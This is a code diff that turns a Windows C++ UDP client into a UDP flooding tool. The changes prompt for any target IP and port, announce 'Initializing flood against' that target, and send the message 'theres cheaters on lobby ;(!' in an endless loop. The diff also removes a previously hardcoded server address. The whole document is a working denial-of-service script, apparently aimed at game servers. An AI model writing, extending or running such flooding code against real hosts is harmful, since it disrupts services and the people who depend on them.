@@ -5,14 +5,16 @@ using namespace std;
 #pragma comment(lib,"ws2_32.lib") 
 #pragma warning(disable:4996) 
 
-#define SERVER "185.41.143.41"  
+#define SERVER "127.0.0.1"  
 #define BUFLEN 512  
-#define PORT 9296  
+#define PORT 8080  
+
+char ip_address[16] = "";
+int port = NULL;
 
 class UDPClient {
 public:
     UDPClient() {
-        cout << "Initializing Winsock...\n";
         if (WSAStartup(MAKEWORD(2, 2), &ws) != 0) {
             cout << "Failed. Error Code: " << WSAGetLastError() << "\n";
             exit(EXIT_FAILURE);
@@ -26,8 +28,8 @@ public:
 
         memset((char*)&server, 0, sizeof(server));
         server.sin_family = AF_INET;
-        server.sin_port = htons(PORT);
-        server.sin_addr.S_un.S_addr = inet_addr(SERVER);
+        server.sin_port = htons(port);
+        server.sin_addr.S_un.S_addr = inet_addr(ip_address);
     }
 
     ~UDPClient() {
@@ -36,7 +38,8 @@ public:
     }
 
     void start() {
-        const char* message = "Hello from uly!";
+        const char* message = "theres cheaters on lobby ;(!";
+        int i = 0;
 
         while (true) {
             if (sendto(client_socket, message, strlen(message), 0, (sockaddr*)&server, sizeof(sockaddr_in)) == SOCKET_ERROR) {
@@ -46,7 +49,11 @@ public:
 
             char answer[BUFLEN] = {};
             int slen = sizeof(sockaddr_in);
+            ++i;
 
+            if (i > 10000000) {
+                cout << i << endl;
+            }
         }
     }
 
@@ -57,7 +64,16 @@ private:
 };
 
 int main() {
-    system("title UDP Client");
+    cout << "ip address (ex: 000.00.00.00):";
+    cin >> ip_address;
+    cout << endl;
+    cout << "port:";
+    cin >> port;
+    cout << endl;
+
+    cout << "Initializing flood against " << ip_address << ":" << port << endl;
+
+
 
     MoveWindow(GetConsoleWindow(), 50, 50, 500, 500, true);
 
